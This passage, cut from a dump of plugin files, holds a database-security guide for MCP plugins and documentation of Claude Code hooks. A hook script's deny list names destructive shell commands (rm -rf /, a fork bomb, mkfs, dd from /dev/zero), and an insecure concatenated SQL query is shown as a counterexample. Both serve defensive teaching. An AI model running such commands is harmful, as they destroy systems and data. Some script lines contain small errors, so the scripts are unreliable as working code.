directory\n```\n\n## SSL/TLS Configuration\n\n### PostgreSQL SSL\n\n**Environment variables:**\n```bash\nexport POSTGRES_URL=\"postgresql://user:pass@db.example.com:5432/dbname?sslmode=require\"\n```\n\n**With certificate files:**\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${DATABASE_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${POSTGRES_URL}\",\n      \"PGSSLMODE\": \"verify-full\",\n      \"PGSSLROOTCERT\": \"/path/to/ca-cert.pem\",\n      \"PGSSLCERT\": \"/path/to/client-cert.pem\",\n      \"PGSSLKEY\": \"/path/to/client-key.pem\"\n    }\n  }\n}\n```\n\n**SSL modes (from least to most secure):**\n- `disable` - No SSL (WARNING: Never use in production)\n- `allow` - Try without SSL, then with SSL\n- `prefer` - Try with SSL, then without\n- `require` - Require SSL (minimum for production)\n- `verify-ca` - Verify CA certificate\n- `verify-full` - Verify CA and hostname (recommended)\n\n### MySQL SSL\n\n**Basic SSL:**\n```bash\nexport MYSQL_URL=\"mysql://user:pass@db.example.com:3306/dbname?ssl-mode=REQUIRE\"\n```\n\n**With certificate verification:**\n```json\n{\n  \"mysql\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-mysql\", \"${MYSQL_URL}\"],\n    \"env\": {\n      \"MYSQL_URL\": \"${MYSQL_CONNECTION_STRING}\",\n      \"MYSQL_SSL_MODE\": \"VERIFY_IDENTITY\",\n      \"MYSQL_SSL_CA\": \"/path/to/ca-cert.pem\",\n      \"MYSQL_SSL_CERT\": \"/path/to/client-cert.pem\",\n      \"MYSQL_SSL_KEY\": \"/path/to/client-key.pem\"\n    }\n  }\n}\n```\n\n## Access Control\n\n### Database User Privileges\n\n**Read-only user (for query operations):**\n```sql\n-- PostgreSQL\nCREATE USER app_readonly WITH PASSWORD 'secure_password';\nGRANT CONNECT ON DATABASE myapp TO app_readonly;\nGRANT USAGE ON SCHEMA public TO app_readonly;\nGRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;\nALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO app_readonly;\n\n-- MySQL\nCREATE USER 'app_readonly'@'%' IDENTIFIED BY 'secure_password';\nGRANT SELECT ON myapp.* TO 'app_readonly'@'%';\nFLUSH PRIVILEGES;\n```\n\n**Read-write user (for insert/update operations):**\n```sql\n-- PostgreSQL\nCREATE USER app_readwrite WITH PASSWORD 'secure_password';\nGRANT CONNECT ON DATABASE myapp TO app_readwrite;\nGRANT USAGE ON SCHEMA public TO app_readwrite;\nGRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_readwrite;\nALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_readwrite;\n\n-- MySQL\nCREATE USER 'app_readwrite'@'%' IDENTIFIED BY 'secure_password';\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'app_readwrite'@'%';\nFLUSH PRIVILEGES;\n```\n\n**Schema-specific permissions:**\n```sql\n-- PostgreSQL - Only access specific schema\nCREATE USER app_specific WITH PASSWORD 'secure_password';\nGRANT CONNECT ON DATABASE myapp TO app_specific;\nGRANT USAGE ON SCHEMA app_data TO app_specific;\nGRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA app_data TO app_specific;\n```\n\n### Row-Level Security (PostgreSQL)\n\nEnable RLS for data isolation:\n```sql\n-- Enable RLS on table\nALTER TABLE users ENABLE ROW LEVEL SECURITY;\n\n-- Policy: Users can only see their own data\nCREATE POLICY user_own_data ON users\n  FOR ALL\n  TO app_user\n  USING (user_id = current_setting('app.current_user_id')::uuid);\n\n-- Set user context in environment\n-- app_user role will automatically filter rows\n```\n\nConfigure MCP server with user context:\n```json\n{\n  \"postgres_rls\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${DATABASE_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${POSTGRES_URL}\",\n      \"PGUSER\": \"${DB_USER}\",\n      \"PGCURRENT_USER_ID\": \"${CURRENT_USER_ID}\"\n    }\n  }\n}\n```\n\n## Connection Security\n\n### Connection String Best Practices\n\n### DO:\n```bash\n# Use strong passwords\nDB_PASSWORD=\"C0mpl3x!P@ssw0rd#2024\"\n\n# Specify SSL\nPOSTGRES_URL=\"postgresql://user:pass@db:5432/db?sslmode=require\"\n\n# Set timeouts\nPOSTGRES_URL=\"postgresql://user:pass@db:5432/db?sslmode=require&connect_timeout=10&connection_limit=10\"\n\n# Use port explicitly\nMYSQL_URL=\"mysql://user:pass@db.example.com:3306/db\"\n```\n\n### DON'T:\n```bash\n# Weak passwords\nDB_PASSWORD=\"password123\"\n\n# No SSL\nPOSTGRES_URL=\"postgresql://user:pass@db:5432/db\"\n\n# Default ports exposed\nPOSTGRES_URL=\"postgresql://user:pass@db.example.com:5432/db\"\n\n# Trust all certificates (insecure)\nPOSTGRES_URL=\"postgresql://user:pass@db:5432/db?sslmode=disable\"\n```\n\n### Network Security\n\n**VPN or Private Network:**\n```bash\n# Use private IP/VPN\nDB_HOST=\"10.0.1.100\"  # Private network\nDB_HOST=\"db.internal.company.com\"  # VPN hostname\n```\n\n**Security Groups (Cloud):**\n```json\n{\n  \"postgres\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-postgres\", \"${DATABASE_URL}\"],\n    \"env\": {\n      \"DATABASE_URL\": \"${POSTGRES_URL}\",\n      \"PGSSLMODE\": \"require\"\n    }\n  }\n}\n```\n\nConfigure security groups to allow only:\n- Plugin server IP addresses\n- Specific port (5432 for PostgreSQL, 3306 for MySQL)\n- SSL/TLS only\n\n**IP Whitelisting:**\n```sql\n-- PostgreSQL\nALTER USER app_user CONNECTION LIMIT 10;\nALTER USER app_user VALID UNTIL '2024-12-31';\n\n-- MySQL\nCREATE USER 'app_user'@'192.168.1.0/24' IDENTIFIED BY 'password';\n-- Only allow connections from specific subnet\n```\n\n## SQL Injection Prevention\n\n### Parameterized Queries\n\n### SECURE:\n```markdown\nSteps:\n1. Use parameterized queries\n2. Validate table/column names\n3. Sanitize user input\n4. Use whitelists\n\nExample:\nSELECT * FROM users WHERE id = $1 AND status = $2\n```\n\n### INSECURE:\n```markdown\nSteps:\n1. Concatenate user input into SQL\n2. Directly interpolate variables\n3. Execute unvalidated SQL\n\nExample:\n\"SELECT * FROM users WHERE id = \" + user_input + \" AND status = '\" + status + \"'\"\n```\n\n### Input Validation\n\n**Table/Column name validation:**\n```markdown\nSteps:\n1. Get schema via MCP tool\n2. Build whitelist of valid identifiers\n3. Check user input against whitelist\n4. Reject invalid names\n\nExample whitelist:\nvalid_tables = ['users', 'products', 'orders']\nvalid_columns = {\n  'users': ['id', 'name', 'email', 'created_at'],\n  'products': ['id', 'title', 'price', 'category']\n}\n```\n\n**Value sanitization:**\n```markdown\nSteps:\n1. Escape special characters\n2. Validate data types\n3. Check length limits\n4. Use parameterized queries\n\nExample:\nif not isinstance(user_id, int):\n    raise ValueError(\"user_id must be an integer\")\nif len(email) > 255:\n    raise ValueError(\"email too long\")\n```\n\n### Schema-Based Validation\n\n```markdown\nSteps:\n1. Use mcp__plugin_myplugin_postgres__describe to get schema\n2. Build validation rules from schema\n3. Validate inputs before query\n4. Reject invalid data\n\nExample validation rules:\n{\n  'users': {\n    'id': {'type': 'uuid', 'required': True},\n    'name': {'type': 'string', 'max_length': 100, 'required': True},\n    'email': {'type': 'string', 'pattern': '^[a-zA-Z0-9._%+-]+@(?:[a-zA-Z0-9-]+\\\\.)+[a-zA-Z]{2,}$', 'required': True},\n    'age': {'type': 'integer', 'min': 0, 'max': 150, 'required': False}\n  }\n}\n```\n\n## Credential Management\n\n### Environment Variables\n\n**Set securely:**\n```bash\n# Method 1: Direct export (current session)\nexport DATABASE_URL=\"postgresql://user:pass@db:5432/db\"\n\n# Method 2: Using .env (add to .gitignore)\necho \"DATABASE_URL=postgresql://user:pass@db:5432/db\" >> .env\n\n# Method 3: Password manager integration\n# Use 1Password, Bitwarden, etc. to generate and store\n```\n\n**Retrieve securely in code:**\n```python\n# Python example\nimport os\nfrom urllib.parse import urlparse\n\ndatabase_url = os.environ.get('DATABASE_URL')\nif not database_url:\n    raise ValueError(\"DATABASE_URL not set\")\n\n# Parse URL components\nparsed = urlparse(database_url)\ndb_config = {\n    'host': parsed.hostname,\n    'port': parsed.port,\n    'database': parsed.path[1:],\n    'username': parsed.username,\n    'password': parsed.password\n}\n```\n\n### Secret Management Services\n\n**AWS Secrets Manager:**\n```bash\n# Retrieve secret\naws secretsmanager get-secret-value \\\n  --secret-id \"myapp/database\" \\\n  --query 'SecretString' \\\n  --output text\n\n# Set environment variable\nexport DATABASE_URL=$(aws secretsmanager get-secret-value \\\n  --secret-id \"myapp/database\" \\\n  --query 'SecretString' \\\n  --output text | jq -r '.DATABASE_URL')\n```\n\n**Azure Key Vault:**\n```bash\n# Retrieve secret\nexport DATABASE_URL=$(az keyvault secret show \\\n  --vault-name \"myapp-vault\" \\\n  --name \"database-url\" \\\n  --query value \\\n  --output tsv)\n```\n\n**HashiCorp Vault:**\n```bash\n# Retrieve secret\nexport DATABASE_URL=$(vault kv get -field=database_url secret/myapp/database)\n```\n\n### Rotating Credentials\n\n**Automated rotation script:**\n```bash\n#!/bin/bash\n# rotate-credentials.sh\n\n# 1. Generate new password\nNEW_PASSWORD=$(openssl rand -base64 32)\n\n# 2. Update in database\npsql -h \"$DB_HOST\" -U postgres -c \\\n  \"ALTER USER app_user WITH PASSWORD '$NEW_PASSWORD';\"\n\n# 3. Update secret manager\naws secretsmanager update-secret-value \\\n  --secret-id \"myapp/database\" \\\n  --secret-string \"{\\\"DATABASE_URL\\\":\\\"postgresql://app_user:$NEW_PASSWORD@$DB_HOST:5432/myapp\\\"}\"\n\n# 4. Notify services to reload (optional)\n# Could trigger a deployment or config reload\n\necho \"Credentials rotated successfully\"\n```\n\n**Schedule rotation:**\n```bash\n# Add to crontab\n# Run monthly\n0 2 1 * * /path/to/rotate-credentials.sh\n```\n\n## Audit Logging\n\n### Database Audit\n\n**PostgreSQL - Enable logging:**\n```sql\n-- Enable audit extension (requires superuser)\nCREATE EXTENSION IF NOT EXISTS pgaudit;\n\n-- Configure logging\nALTER SYSTEM SET log_statement = 'all';\nALTER SYSTEM SET log_min_duration_statement = 1000;  -- Log queries > 1s\nALTER SYSTEM SET log_connections = on;\nALTER SYSTEM SET log_disconnections = on;\nSELECT pg_reload_conf();\n```\n\n**MySQL - Enable logging:**\n```ini\n# my.cnf\n[mysqld]\nlog-error = /var/log/mysql/error.log\ngeneral_log = 1\ngeneral_log_file = /var/log/mysql/general.log\nslow_query_log = 1\nslow_query_log_file = /var/log/mysql/slow.log\nlong_query_time = 1\n```\n\n### Application Audit\n\n**Log all database operations:**\n```markdown\nSteps:\n1. Log connection attempts (success/failure)\n2. Log query execution with timing\n3. Log data modifications\n4. Store logs securely\n5. Monitor for suspicious activity\n\nExample log format:\n[2024-01-15 10:30:45] QUERY user=app_user db=myapp duration=125ms\nSELECT * FROM users WHERE id = '550e8400-e29b-41d4-a716--446655440000'\n```\n\n## Security Monitoring\n\n### Detect Suspicious Activity\n\n**Monitor for:**\n- Failed authentication attempts\n- Unusual query patterns\n- Large data exports\n- Access from new locations\n- Query timeouts\n- Connection spikes\n\n**Example monitoring script:**\n```bash\n#!/bin/bash\n# monitor-db-security.sh\n\n# Check for failed connections\nif grep -q \"password authentication failed\" /var/log/postgresql/postgresql.log; then\n    echo \"WARNING: Failed authentication attempts detected\"\n    # Send alert\nfi\n\n# Check for slow queries\nif grep -q \"duration: [5-9][0-9][0-9][0-9]ms\" /var/log/postgresql/postgresql.log; then\n    echo \"WARNING: Slow queries detected\"\n    # Send alert\nfi\n\n# Check for unusual activity\nPATTERN=$(tail -100 /var/log/postgresql/postgresql.log | grep -o \"SELECT.*FROM.*WHERE\" | sort | uniq -c | sort -rn | head -5)\nif [ -n \"$PATTERN\" ]; then\n    echo \"Top queries:\"\n    echo \"$PATTERN\"\nfi\n```\n\n## Compliance Considerations\n\n### GDPR Compliance\n\n**Data protection:**\n```sql\n-- Right to be forgotten\nDELETE FROM users WHERE id = $1;\n\n-- Data export\nSELECT id, name, email FROM users WHERE id = $1;\n\n-- Audit trail\nINSERT INTO audit_log (user_id, action, timestamp)\nVALUES ($1, 'data_export', NOW());\n```\n\n### PCI DSS Compliance\n\n**Credit card data:**\n```sql\n-- Never store full card numbers\nCREATE TABLE payments (\n  id UUID PRIMARY KEY,\n  user_id UUID REFERENCES users(id),\n  card_last_four CHAR(4),  -- Only last 4 digits\n  card_type VARCHAR(50),\n  amount DECIMAL(10,2),\n  created_at TIMESTAMP\n);\n```\n\n## Security Checklist\n\n### Pre-Production\n\n- [ ] All credentials use environment variables\n- [ ] SSL/TLS enabled and verified\n- [ ] Database users have minimal privileges\n- [ ] SQL injection prevention implemented\n- [ ] Input validation on all queries\n- [ ] Audit logging enabled\n- [ ] Secrets stored in secure manager\n- [ ] Network access restricted (VPN/private)\n- [ ] Passwords meet complexity requirements\n- [ ] Connection timeouts configured\n- [ ] Query timeouts configured\n- [ ] Rate limiting implemented\n- [ ] Monitoring in place\n\n### Ongoing\n\n- [ ] Credentials rotated regularly\n- [ ] Security patches applied\n- [ ] Log monitoring active\n- [ ] Access reviewed quarterly\n- [ ] Penetration testing performed\n- [ ] Backup encryption verified\n- [ ] Disaster recovery tested\n\n## Incident Response\n\n### Credential Compromise\n\n**Immediate actions:**\n1. Rotate compromised credentials\n2. Revoke active sessions\n3. Review access logs\n4. Notify stakeholders\n5. Implement additional monitoring\n\n**Example response:**\n```bash\n#!/bin/bash\n# emergency-credential-rotation.sh\n\nNEW_PASSWORD=$(openssl rand -base64 32)\n\n# 1. Update database\npsql -h \"$DB_HOST\" -U admin -c \"ALTER USER app_user WITH PASSWORD '$NEW_PASSWORD';\"\n\n# 2. Update secrets manager\naws secretsmanager update-secret-value \\\n  --secret-id \"myapp/database\" \\\n  --secret-string \"{\\\"DATABASE_URL\\\":\\\"postgresql://app_user:$NEW_PASSWORD@$DB_HOST:5432/myapp\\\"}\"\n\n# 3. Force restart of services\nsystemctl restart myapp-service\n\n# 4. Log incident\necho \"[$(date)] Credential compromise detected and remediated\" >> /var/log/security/incidents.log\n```\n\n### Suspicious Activity\n\n**Detection:**\n- Monitor for data exfiltration\n- Check for unauthorized queries\n- Verify access patterns\n- Review failed attempts\n\n**Response:**\n1. Isolate affected systems\n2. Preserve evidence\n3. Investigate root cause\n4. Implement fixes\n5. Update monitoring\n\n## Best Practices Summary\n\n### For Developers\n\n1. **Never hardcode credentials** - Always use environment variables\n2. **Enable SSL/TLS** - Never use unencrypted connections\n3. **Use least privilege** - Database users should have minimal permissions\n4. **Validate all inputs** - Prevent SQL injection\n5. **Log security events** - Monitor for suspicious activity\n6. **Rotate credentials** - Regular rotation prevents long-term exposure\n7. **Test security** - Include security tests in CI/CD\n8. **Document security** - Keep security documentation current\n\n### For Operations\n\n1. **Use secret managers** - AWS Secrets Manager, Azure Key Vault, etc.\n2. **Implement monitoring** - Real-time security monitoring\n3. **Regular audits** - Quarterly access reviews\n4. **Patch management** - Keep database servers updated\n5. **Backup encryption** - Encrypt all database backups\n6. **Network segmentation** - Use VPCs, security groups\n7. **Incident response** - Document and test procedures\n8. **Compliance** - Follow GDPR, PCI DSS, etc.\n\n## Conclusion\n\nDatabase security requires:\n- **Strong authentication** with environment variables\n- **SSL/TLS encryption** for all connections\n- **Least privilege access** with minimal user permissions\n- **Input validation** to prevent SQL injection\n- **Audit logging** for monitoring and compliance\n- **Secret management** for credential storage\n- **Regular rotation** of credentials and keys\n- **Continuous monitoring** for suspicious activity\n\nFollow these practices to ensure secure database integration in MCP-based plugins.",
        "plugins/sys-core/skills/managing-hooks/SKILL.md": "---\nname: managing-hooks\ndescription: \"Comprehensive guide for creating, configuring, and using Claude Code hooks. MUST Use when creating hooks, implementing PreToolUse/PostToolUse/Stop hooks, or configuring event-driven automation. Do not use for general automation, workflow management, or task execution.\"\n---\n\n# Hook Development for Claude Code Plugins\n\n\n\n## Hook Types\n\n### Prompt-Based Hooks (LLM-Driven)\n\n```json\n{\n  \"type\": \"prompt\",\n  \"prompt\": \"Evaluate if this tool use is appropriate: $TOOL_INPUT\",\n  \"timeout\": 30\n}\n```\n\n**See:** `references/prompt-hooks.md`\n\n### Command Hooks (Bash-Driven)\n\n```json\n{\n  \"type\": \"command\",\n  \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/validate.sh\",\n  \"timeout\": 60\n}\n```\n\n\n\n**See:** `references/command-hooks.md`\n\n## Hook Configuration\n\nPlugin hooks use `hooks/hooks.json` format:\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Validate file write safety\"\n          }\n        ]\n      }\n    ],\n    \"Stop\": [\n      {\n        \"matcher\": \"*\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Verify task completion\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n**See:** `references/configuration.md`\n\n## Hook Events\n\n| Event | When | Purpose | Decision |\n|-------|------|---------|----------|\n| **PreToolUse** | Before tool | Validation/modification | allow/deny/ask |\n| **PostToolUse** | After tool | Feedback/logging | None |\n| **Stop** | Agent stops | Completion check | approve/block |\n| **SessionStart** | Session begins | Setup/context | None |\n| **SessionEnd** | Session ends | Cleanup | None |\n| **UserPromptSubmit** | User input | Validation | None |\n| **SubagentStop** | Subagent done | Task validation | approve/block |\n\n**See:** `references/events.md`\n\n## Input/Output Formats\n\nAll hooks receive JSON via stdin:\n\n```json\n{\n  \"session_id\": \"abc123\",\n  \"transcript_path\": \"/path/to/transcript.txt\",\n  \"cwd\": \"/current/working/directory\",\n  \"permission_mode\": \"ask|allow|bypass\",\n  \"hook_event_name\": \"PreToolUse\"\n}\n```\n\n**See:** `references/io-formats.md`\n\n### Output Format\n\n```json\n{\n  \"continue\": true,\n  \"suppressOutput\": false,\n  \"systemMessage\": \"Message for Claude\"\n}\n```\n\n### Exit Codes\n\n- **0** - Success, continue, show stdout\n- **1** - Non-blocking error, continue, log stderr\n- **2** - Blocking error, halt operation\n- **124** - Timeout\n\n**See:** `references/exit-codes.md`\n\n## Environment Variables\n\nAvailable in command hooks:\n- `$CLAUDE_PROJECT_DIR` - Project root directory\n- `$CLAUDE_PLUGIN_ROOT` - Plugin directory (use for portability)\n- `$CLAUDE_ENV_FILE` - SessionStart only\n- `$CLAUDE_CODE_REMOTE` - Set if running remotely\n\n**Always use `${CLAUDE_PLUGIN_ROOT}` for portability.**\n\n## Matchers\n\n**Exact:** `\"Write\"`\n**Multiple:** `\"Write|Edit|Read\"`\n**Wildcard:** `\"*\"`\n**Regex:** `\"mcp__.*__delete.*\"` (all MCP delete tools)\n\n## Security Best Practices\n\n### DO\n- Use prompt hooks for complex validation\n- Use `${CLAUDE_PLUGIN_ROOT}` for all paths\n- Validate all inputs in command hooks\n- Quote all bash variables\n- Set appropriate timeouts (5-10s quick, 30s standard, 60s complex)\n\n### DON'T\n- Hardcode absolute paths\n- Trust user input without validation\n- Create long-running hooks (>60s)\n- Rely on hook execution order (hooks run in parallel)\n- Log sensitive information\n\n## Reference Materials\n\n**Core Documentation:**\n- `references/prompt-hooks.md` - Prompt-based implementation\n- `references/command-hooks.md` - Command-based implementation\n- `references/configuration.md` - Configuration guide\n- `references/events.md` - All events with examples\n- `references/io-formats.md` - Input/output formats\n- `references/security.md` - Security practices\n- `references/performance.md` - Performance optimization\n- `references/troubleshooting.md` - Common issues\n\n**Implementation Workflow:**\n1. Identify requirements (what events? what validation?)\n2. Choose hook types (prompt for complex, command for fast)\n3. Write hook scripts (use set -euo pipefail)\n4. Configure hooks (edit hooks/hooks.json)\n5. Validate configuration\n6. Test hooks with sample data\n7. Document hooks\n\n**Focus:** Security (prompt hooks), Performance (command hooks), Usability, Maintainability\n\n## Conclusion\n\nUse prompt-based hooks for complex, context-aware validation and command hooks for fast, deterministic checks. Always validate inputs, use proper timeouts, and test thoroughly.\n\n**Next Steps:**\n- Review `references/` for detailed documentation\n- Examine `examples/` for working implementations\n- Test with minimal configuration first\n",
        "plugins/sys-core/skills/managing-hooks/references/advanced.md": "# Advanced Hook Use Cases and Techniques\n\nThis reference covers sophisticated hook patterns for complex automation workflows, multi-stage validation, and integration with external systems.\n\n## Multi-Stage Validation\n\n### Overview\nCombine command hooks (fast) with prompt hooks (intelligent) for optimal performance and security.\n\n### Implementation\n\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/quick-check.sh\",\n          \"timeout\": 5\n        },\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Deep analysis of bash command: $TOOL_INPUT.command. Check for: 1) Sophisticated command injection 2) Obfuscated destructive operations 3) Context-dependent dangers 4) Intent vs literal meaning 5) Hidden side effects. Return decision with detailed explanation.\",\n          \"timeout\": 20\n        }\n      ]\n    }\n  ]\n}\n```\n\n### quick-check.sh (Ultra-Fast Path)\n```bash\n#!/bin/bash\nset -euo pipefail\n\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command // empty')\n\n# Ultra-fast approval: obviously safe commands\nif [[ \"$command\" =~ ^(ls|pwd|echo|date|whoami|id|hostname|uname|cat|less|more|tail|head|grep|find|which|whereis)$ ]]; then\n  exit 0\nfi\n\n# Ultra-fast denial: extremely dangerous\nif [[ \"$command\" == *\"rm -rf /\"* ]] || \\\n   [[ \"$command\" == *\":(){ :|:& };:\"* ]] || \\\n   [[ \"$command\" == *\"mkfs\"* ]] || \\\n   [[ \"$command\" == *\"dd if=/dev/zero\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"Extremely dangerous operation detected\"}' >&2\n  exit 2\nfi\n\n# Let prompt hook handle everything else\nexit 0\n```\n\n### Benefits\n\n1. **Instant approval** for safe commands (< 5ms)\n2. **Instant denial** for obviously dangerous commands (< 5ms)\n3. **Intelligent analysis** for everything else (500-2000ms)\n4. **Best of both worlds**: Speed + Intelligence\n\n### Performance Comparison\n\n| Command Type | Command Hook Only | Prompt Hook Only | Hybrid Approach |\n|--------------|------------------|------------------|-----------------|\n| Safe (ls) | 5ms | 800ms | 5ms |\n| Dangerous (rm -rf) | 5ms | 900ms | 5ms |\n| Unknown | 5ms | 1200ms | 1200ms |\n| Complex | N/A | 2000ms | 2000ms |\n\n---\n\n## Cross-Event Workflows\n\n### Overview\nCoordinate hooks across different events to track state and enforce complex workflows.\n\n### Implementation: Testing Enforcement\n\n**SessionStart - Initialize tracking:**\n```bash\n#!/bin/bash\n# Initialize test tracking\necho \"0\" > /tmp/test-runs-$$\necho \"0\" > /tmp/build-runs-$$\necho \"[]\" > /tmp modified-files-$$\n```\n\n**PostToolUse - Track events:**\n```bash\n#!/bin/bash\ninput=$(cat)\ntool_name=$(echo \"$input\" | jq -r '.tool_name')\ntool_result=$(echo \"$input\" | jq -r '.tool_result // empty')\n\n# Track test executions\nif [ \"$tool_name\" = \"Bash\" ] && [[ \"$tool_result\" == *\"test\"* ]]; then\n  count=$(cat /tmp/test-runs-$$ 2>/dev/null || echo \"0\")\n  echo $((count + 1)) > /tmp/test-runs-$$\nfi\n\n# Track builds\nif [ \"$tool_name\" = \"Bash\" ] && [[ \"$tool_result\" == *\"build\"* ]]; then\n  count=$(cat /tmp/build-runs-$$ 2>/dev/null || echo \"0\")\n  echo $((count + 1)) > /tmp/build-runs-$$\nfi\n\n# Track file modifications\nif [ \"$tool_name\" = \"Write\" ] || [ \"$tool_name\" = \"Edit\" ]; then\n  file_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n  files=$(cat /tmp/modified-files-$$ 2>/dev/null || echo \"[]\")\n  echo \"$files\" | jq --arg fp \"$file_path\" '. + [$fp]' > /tmp/modified-files-$$\nfi\n\nexit 0\n```\n\n**Stop - Enforce based on tracking:**\n```bash\n#!/bin/bash\ntest_count=$(cat /tmp/test-runs-$$ 2>/dev/null || echo \"0\")\nbuild_count=$(cat /tmp/build-runs-$$ 2>/dev/null || echo \"0\")\nmodified_files=$(cat /tmp/modified-files-$$ 2>/dev/null || echo \"[]\")\n\n# Check if code was modified\ncode_modified=$(echo \"$modified_files\" | jq 'length > 0')\n\nif [ \"$code_modified\" = \"true\" ]; then\n  # Code was modified, enforce testing and building\n  if [ \"$test_count\" -eq \"0\" ]; then\n    echo '{\"decision\": \"block\", \"reason\": \"Code was modified but no tests were run. Please run tests before stopping.\"}' >&2\n    exit 2\n  fi\n\n  if [ \"$build_count\" -eq \"0\" ]; then\n    echo '{\"decision\": \"block\", \"reason\": \"Code was modified but project was not built. Please run build before stopping.\"}' >&2\n    exit 2\n  fi\nfi\n\n# Cleanup\nrm -f /tmp/test-runs-$$ /tmp/build-runs-$$ /tmp/modified-files-$$\n\necho '{\"decision\": \"approve\"}'\nexit 0\n```\n\n**Configuration:**\n```json\n{\n  \"SessionStart\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/init-tracking.sh\"\n        }\n      ]\n    }\n  ],\n  \"PostToolUse\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/track-events.sh\"\n        }\n      ]\n    }\n  ],\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/enforce-quality.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Use Cases\n\n1. **Testing enforcement**: Track file changes  require tests\n2. **Build verification**: Track builds  verify success\n3. **Code review**: Track modifications  require review\n4. **Deployment gates**: Track changes  require approvals\n\n---\n\n## Context-Aware Prompt Hooks\n\n### Overview\nUse transcript and session context for intelligent, informed decisions.\n\n### Implementation\n\n```json\n{\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Review the complete transcript at $TRANSCRIPT_PATH. Analyze: 1) What was the user's original request? 2) What work has been completed? 3) Are there any open questions or TODOs? 4) Were all requirements addressed? 5) Is there evidence of testing and quality checks? 6) Has the user indicated satisfaction? Return 'approve' if task is complete, or 'block' with specific missing items and next steps.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Advanced Context Patterns\n\n**Pattern 1: Requirement Tracking**\n```json\n\"prompt\": \"Review transcript. Extract all user requirements from initial prompt. Check each requirement: 1) Was it addressed? 2) Was it completed successfully? 3) Are there any partial implementations? 4) Did user confirm completion? Return 'approve' if all requirements met, or list incomplete requirements.\"\n```\n\n**Pattern 2: Decision Documentation**\n```json\n\"prompt\": \"Analyze transcript for key decisions made during the session: 1) Technical decisions (architecture, tools, approaches) 2) User preferences expressed 3) Constraints identified 4) Trade-offs discussed. Summarize decisions and verify they were implemented correctly.\"\n```\n\n**Pattern 3: Quality Gate Validation**\n```json\n\"prompt\": \"Quality gate checklist: 1) Code changes  tests run? 2) Tests  all passing? 3) Build  successful? 4) Documentation  updated? 5) Security  reviewed? 6) Performance  acceptable? Return 'approve' only if all gates passed, or list failed gates.\"\n```\n\n---\n\n## Dynamic Configuration\n\n### Overview\nModify hook behavior based on project configuration, environment, or user preferences.\n\n### Implementation: Config-File Driven Hooks\n\n**Script (configurable-validate.sh):**\n```bash\n#!/bin/bash\nset -euo pipefail\n\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path // empty')\n\n# Load configuration\nCONFIG_FILE=\"$CLAUDE_PROJECT_DIR/.claude/hook-config.json\"\n\nif [ ! -f \"$CONFIG_FILE\" ]; then\n  # Use defaults\n  STRICT_MODE=false\n  MAX_FILE_SIZE=1000000\n  ALLOWED_EXTENSIONS=\"[]\"\nelse\n  STRICT_MODE=$(jq -r '.strictMode // false' \"$CONFIG_FILE\")\n  MAX_FILE_SIZE=$(jq -r '.maxFileSize // 1000000' \"$CONFIG_FILE\")\n  ALLOWED_EXTENSIONS=$(jq -r '.allowedExtensions // \"[]\"' \"$CONFIG_FILE\")\n  FORBIDDEN_PATHS=$(jq -r '.forbiddenPaths // \"[]\"' \"$CONFIG_FILE\")\nfi\n\n# Apply strict mode checks\nif [ \"$STRICT_MODE\" = \"true\" ]; then\n  # Additional validations in strict mode\n  if [[ \"$file_path\" == *\".log\"* ]] || [[ \"$file_path\" == *\".tmp\"* ]]; then\n    echo '{\"continue\": true, \"systemMessage\": \"Log/temp files not allowed in strict mode\"}' >&2\n    exit 2\n  fi\nfi\n\n# Check file size\nfile_content=$(echo \"$input\" | jq -r '.tool_input.content // empty')\nif [ -n \"$file_content\" ]; then\n  content_size=${#file_content}\n  if [ \"$content_size\" -gt \"$MAX_FILE_SIZE\" ]; then\n    echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"File size ($((content_size / 1024))KB) exceeds limit ($((MAX_FILE_SIZE / 1024))KB)\\\"}\" >&2\n    exit 2\n  fi\nfi\n\n# Check allowed extensions\nif [ \"$ALLOWED_EXTENSIONS\" != \"[]\" ]; then\n  